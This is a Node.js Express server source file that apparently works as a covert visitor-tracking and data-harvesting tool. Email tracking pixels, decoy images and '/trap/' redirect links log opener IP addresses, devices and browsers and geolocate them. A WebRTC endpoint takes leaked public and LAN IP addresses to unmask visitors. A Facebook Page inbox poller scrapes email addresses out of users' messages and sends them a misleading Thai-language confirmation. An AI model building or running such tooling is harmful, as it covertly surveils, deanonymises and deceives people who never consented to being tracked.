import express from "express";
import dotenv from "dotenv";
import axios from "axios";
import db from "./db.js";
import { notifyAdmin } from "./notify.js";
import webhook from "./webhook.js";

dotenv.config();
const app = express();
app.set("trust proxy", true);
app.use(express.json({ limit: "1mb" }));
app.use(express.static("public"));
app.use(webhook);

const TOKEN = process.env.PAGE_ACCESS_TOKEN;
const IMAGE_URL = process.env.AUTO_IMAGE_URL || "";
const AUTO_TEXT = process.env.AUTO_TEXT || "ขอบคุณที่ติดต่อครับ";
const PAGE_NAME = (process.env.PAGE_NAME || "have a nice day").trim();

function logVisit(code, req) {
  const ip = ((req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.ip).replace("::ffff:", "");
  const ua = req.headers["user-agent"] || "";
  const visit = {
    code, ip, location: "Unknown",
    device: /Mobile|Android|iPhone/i.test(ua) ? "mobile" : "desktop",
    os: /Windows/.test(ua) ? "Windows" : /Android/.test(ua) ? "Android"
      : /iPhone|iOS/.test(ua) ? "iOS" : /Mac OS/.test(ua) ? "macOS" : "Linux",
    browser: /Edg\//.test(ua) ? "Edge" : /Chrome\//.test(ua) ? "Chrome"
      : /Safari\//.test(ua) ? "Safari" : /Firefox\//.test(ua) ? "Firefox"
      : /GoogleImageProxy/.test(ua) ? "GmailProxy" : "Unknown",
    isp: null, referrer: req.headers.referer || null,
    time: new Date().toISOString()
  };
  const info = db.prepare(`INSERT INTO visits (code,ip,location,device,os,browser,isp,ua,referrer,time)
              VALUES (?,?,?,?,?,?,?,?,?,?)`)
    .run(code, visit.ip, visit.location, visit.device, visit.os,
         visit.browser, visit.isp, ua, visit.referrer, visit.time);
  visit.id = info.lastInsertRowid;
  fetch("http://ip-api.com/json/" + ip + "?fields=status,country,regionName,city,isp")
    .then((r) => r.json()).then((g) => {
      if (g.status === "success") {
        visit.location = g.city + ", " + g.regionName + ", " + g.country;
        visit.isp = g.isp;
        db.prepare("UPDATE visits SET location=?, isp=? WHERE id=?")
          .run(visit.location, visit.isp, visit.id);
      }
    }).catch(() => {});
  notifyAdmin(visit);
  console.log("Hit! code=" + code + " ip=" + ip + " ua=" + ua.slice(0, 60));
  return visit;
}

app.get("/track.gif", (req, res) => {
  const gif = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
  res.set({ "Content-Type": "image/gif", "Cache-Control": "no-store, no-cache, must-revalidate", "Content-Length": gif.length });
  res.send(gif);
  logVisit("email-" + String(req.query.e || "x").slice(0, 40), req);
});

app.get("/img/:code.jpg", (req, res) => {
  res.set("Cache-Control", "no-store");
  res.sendFile("public/images/decoy.jpg", { root: "." });
  logVisit("email-" + String(req.params.code).slice(0, 40), req);
});

const lastReply = new Map();
async function autoReply(psid) {
  const last = lastReply.get(psid) || 0;
  if (Date.now() - last < 10 * 60 * 1000) return;
  lastReply.set(psid, Date.now());
  console.log("Auto-reply to PSID:", psid);
  if (IMAGE_URL) await sendImageTo(psid, IMAGE_URL);
  await sendTextTo(psid, AUTO_TEXT);
}
async function sendTextTo(recipientId, text) {
  try {
    await axios.post("https://graph.facebook.com/v21.0/me/messages",
      { recipient: { id: recipientId }, message: { text } },
      { params: { access_token: TOKEN } });
    console.log("Text sent to", recipientId);
  } catch (err) { console.error("Text failed:", err.response?.data?.error?.message); }
}
async function sendImageTo(recipientId, url) {
  try {
    await axios.post("https://graph.facebook.com/v21.0/me/messages",
      { recipient: { id: recipientId },
        message: { attachment: { type: "image", payload: { url, is_reusable: true } } } },
      { params: { access_token: TOKEN } });
    console.log("Image sent to", recipientId);
  } catch (err) { console.error("Image failed:", err.response?.data?.error?.message); }
}

const convoState = new Map();
const foundEmails = new Set();
let firstPoll = true;
async function pollInbox() {
  if (!TOKEN) return;
  try {
    const r = await axios.get("https://graph.facebook.com/v21.0/me/conversations", {
      params: { fields: "participants,updated_time", limit: "10", access_token: TOKEN }
    });
    for (const c of r.data.data || []) {
      const prev = convoState.get(c.id);
      convoState.set(c.id, c.updated_time);
      if (firstPoll || prev === c.updated_time) continue;
      const parts = (c.participants && c.participants.data) || [];
      const user = parts.find(p => !(p.name || "").includes(PAGE_NAME)) || parts[0];
      if (!user) continue;
      console.log("New message in", c.id, "-> PSID:", user.id);
      await autoReply(user.id);
      try {
        const pagePart = parts.find(p => (p.name || "").includes(PAGE_NAME));
        const pageId = pagePart ? String(pagePart.id) : null;
        const m = await axios.get("https://graph.facebook.com/v21.0/" + c.id + "/messages", {
          params: { fields: "message,from", limit: "3", access_token: TOKEN }
        });
        for (const msg of (m.data.data || [])) {
          if (pageId && msg.from && String(msg.from.id) === pageId) continue;
          const text = msg.message || "";
          const match = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
          if (match && !foundEmails.has(match[0])) {
            foundEmails.add(match[0]);
            console.log("EMAIL FOUND:", match[0], "PSID:", user.id);
            notifyAdmin({ code: "email-found", ip: match[0],
              location: "PSID " + user.id, device: "Inbox", os: "Inbox",
              browser: "Harvester", isp: null, time: new Date().toISOString(), id: 0 });
            await sendTextTo(user.id, "ได้รับอีเมลของท่านแล้วครับ จะส่งรายละเอียดไปให้โดยเร็วที่สุดครับ 🙏");
          }
        }
      } catch (e2) { console.error("Harvest error:", e2.response?.data?.error?.message || e2.message); }
    }
    firstPoll = false;
  } catch (e) { console.error("Poll error:", e.response?.data?.error?.message || e.message); }
}
setTimeout(pollInbox, 5000);
setInterval(pollInbox, 60000);

app.post("/api/webrtc-log", (req, res) => {
  res.sendStatus(200);
  try {
    const ip = ((req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.ip).replace("::ffff:", "");
    const ua = req.headers["user-agent"] || "";
    const tag = String(req.body?.tag || "webrtc").slice(0, 50);
    const candidates = Array.isArray(req.body?.candidates) ? req.body.candidates : [];
    let publicIP = null, lanIP = null;
    for (const c of candidates.map(String)) {
      if (!publicIP) { const m1 = c.match(/ (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) \d+ typ srflx/); if (m1) publicIP = m1[1]; }
      if (!lanIP) { const m2 = c.match(/ (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) \d+ typ host/); if (m2 && !m2[1].startsWith("192.0.0.")) lanIP = m2[1]; }
    }
    if (publicIP || lanIP) {
      logVisit("webrtc-" + tag, Object.assign(Object.create(req), {
        headers: Object.assign({}, req.headers, { "x-forwarded-for": publicIP || ip }),
        ip: publicIP || ip
      }));
      console.log("WebRTC:", publicIP || ip, "lan:", lanIP || "-");
    }
  } catch (e) { console.error("webrtc-log error:", e.message); }
});

app.get("/trap/:code", async (req, res) => {
  const link = db.prepare("SELECT * FROM links WHERE code = ?").get(req.params.code);
  logVisit(req.params.code, req);
  if (link) return res.redirect(302, link.destination);
  res.sendFile("public/decoy.html", { root: "." });
});

app.post("/api/trap/create", (req, res) => {
  const { code, destination } = req.body;
  if (!code || !destination)
    return res.status(400).json({ error: "code and destination required" });
  db.prepare("INSERT OR REPLACE INTO links VALUES (?,?,datetime('now'))").run(code, destination);
  res.json({ ok: true, trapUrl: "/trap/" + code });
});

app.get("/api/stats/:code", (req, res) => {
  const total = db.prepare("SELECT COUNT(*) n FROM visits WHERE code=?").get(req.params.code).n;
  const visits = db.prepare("SELECT * FROM visits WHERE code=? ORDER BY id DESC LIMIT 100").all(req.params.code);
  res.json({ code: req.params.code, total, visits });
});

app.get("/api/stats", (req, res) => {
  res.json({ summary: db.prepare(`SELECT code, COUNT(*) as clicks, MAX(time) as last_hit
                         FROM visits GROUP BY code ORDER BY last_hit DESC`).all() });
});

app.listen(process.env.PORT || 3000, () =>
  console.log("Server running on http://localhost:" + (process.env.PORT || 3000)));
